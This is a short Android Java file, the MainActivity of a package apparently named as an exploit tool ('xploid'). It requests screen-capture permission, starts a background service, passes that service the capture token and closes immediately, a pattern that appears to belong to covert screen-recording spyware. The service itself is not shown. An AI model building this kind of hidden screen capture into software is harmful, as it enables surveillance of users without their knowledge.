package com.zero.xploid;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request Media Projection for screenshot/screen recording
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
        
        // Start the background service
        Intent serviceIntent = new Intent(this, MainService.class);
        startService(serviceIntent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE && resultCode == RESULT_OK) {
            MainService.setData(data, resultCode);
        }
        finish();
    }
}
